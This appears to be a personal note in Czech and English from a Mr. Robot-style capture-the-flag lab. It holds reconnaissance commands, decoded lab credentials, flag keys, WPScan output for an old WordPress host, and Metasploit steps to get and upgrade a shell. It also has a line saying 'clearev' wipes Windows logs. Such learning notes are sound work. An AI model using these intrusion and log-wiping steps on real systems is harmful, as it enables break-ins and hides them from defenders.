---
date: 2025-10-09T21:58
cssclasses:
---
netdiscover -r 192.168.0.1/24 -F "ether host mad adresa"

gobuster dir -u http://1.2.3.4/ -x .txt,.php,.html -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 64 -q

dcode.fr 
https://crackstation.net/ - decode hashů, md5, sha256 a další

ZWxsaW90OkVSMjgtMDY1Mgo=
decrypted:
elliot:ER28-0652

key 1 073403c8a58a1f80d943455fb30724b9
key 2 822c73956184f694993bede3eb39f959

wpscan --url 10.15.0.236
sestavení wordpressu, jeho pluginy, verze....

## WPScan
[+] URL: http://10.15.0.236/ [10.15.0.236]
[+] Started: Thu Oct  9 09:15:26 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.15.0.236/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.15.0.236/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://10.15.0.236/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.15.0.236/9752995.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.15.0.236/9752995.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.15.0.236/wp-content/themes/twentyfifteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://10.15.0.236/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.0
 | Style URL: http://10.15.0.236/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.15.0.236/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:51 <====================================> (137 / 137) 100.00% Time: 00:00:51

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Oct  9 09:16:59 2025
[+] Requests Done: 189
[+] Cached Requests: 6
[+] Data Sent: 44.793 KB
[+] Data Received: 22.677 MB
[+] Memory used: 274.207 MB
[+] Elapsed time: 00:01:32



## metasploit
`msfconsole` 
search něco co chci vyhledat
`search wordpress shell`
use číslo payloadu co chceš
`use 6`
`show options`
`set (jméno proměnný) (proměnná)`
`show advanced options`
`run`
"eskalace" do shellu
`python -c 'import pty; pty.spawn("/bin/bash")'`

**clearev** - smaže všechny windows logs


find / -type f -name "key-*"